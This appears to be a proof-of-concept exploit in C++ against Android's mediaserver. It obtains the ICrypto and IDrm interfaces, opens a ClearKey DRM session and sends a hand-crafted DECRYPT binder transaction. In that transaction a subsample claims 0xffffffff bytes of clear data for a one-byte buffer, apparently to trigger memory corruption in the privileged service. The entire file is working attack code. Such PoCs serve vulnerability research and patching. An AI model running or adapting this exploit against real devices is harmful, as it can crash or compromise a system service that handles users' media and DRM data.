#define private public
#define LOG_TAG "mediapoc"
//#define LOG_NDEBUG 0

#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <binder/IPCThreadState.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>
#include <cutils/properties.h>
#include <utils/Log.h>
#include <binder/Parcel.h>    
#include <cstring>
#include <cstdio>
#include <binder/ProcessState.h>    
#include <binder/IPCThreadState.h>

#include <binder/IServiceManager.h>    
#include <media/IMediaPlayerService.h>   
#include <media/ICrypto.h>
#include <media/IAudioFlinger.h>
#include <media/IDrm.h>
using namespace android;

const int DECRYPT = 6;
void testInit(ICrypto* crypto){

BpInterface<ICrypto>* sit = (BpInterface<ICrypto>*)crypto;
Parcel data,reply;
data.writeInterfaceToken(sit->getInterfaceDescriptor());
sit->remote()->transact(1, data, &reply);
ssize_t result = reply.readInt32();
printf("result %d\n", result);

}
template <typename T>
void fuck(BpInterface<T>* sit)
{
	Parcel data, reply;
data.writeInterfaceToken(sit->getInterfaceDescriptor());
data.writeInt32(0);
data.writeInt32(0);

static const uint8_t kDummy[16] = { 0 };

data.write(kDummy, 16);
data.write(kDummy, 16);
char buf[100] = {0};
data.writeInt32(1);
data.write(buf,1);


const int ss = 0x1;
data.writeInt32(ss);
CryptoPlugin::SubSample samples[ss];
for(int i=0;i<ss;i++)
{
	samples[i].mNumBytesOfEncryptedData = 0;
	samples[i].mNumBytesOfClearData = 0xffffffff;
}
data.write(samples, sizeof(CryptoPlugin::SubSample) *ss);
status_t st = sit->remote()->transact(DECRYPT, data, &reply);
ssize_t result = reply.readInt32();
printf("result %d\n", result);
printf("error %s\n", reply.readCString());
printf("status %d\n", st);
}

static const uint8_t kClearKeyUUID[16] = {
        0x10,0x77,0xEF,0xEC,0xC0,0xB2,0x4D,0x02,
        0xAC,0xE3,0x3C,0x1E,0x52,0xE2,0xFB,0x4B
    };

int main(int argc, char** argv)
{
    status_t st;
   sp<ICrypto> crypto = interface_cast<IMediaPlayerService>(defaultServiceManager()->getService(String16("media.player")))->makeCrypto();
   
   sp<IDrm> drm = interface_cast<IMediaPlayerService>(defaultServiceManager()->getService(String16("media.player")))->makeDrm();

    Vector<uint8_t> sess;
    st = drm->createPlugin(kClearKeyUUID);
    printf("drm create status %d\n", st);
    st = drm->openSession(sess);
    printf("opensess status %d\n", st);
    printf("sess size %d\n", sess.size());

    char sess_id[2] = {'1','0'};
//    st = crypto->createPlugin(kClearKeyUUID, sess.array(), sess.size());
    printf("create status %d\n", st);
    testInit(crypto.get());
    BpInterface<ICrypto> *sit = static_cast<BpInterface<ICrypto>* >(crypto.get());
    fuck(sit);

    
    return 0;
}
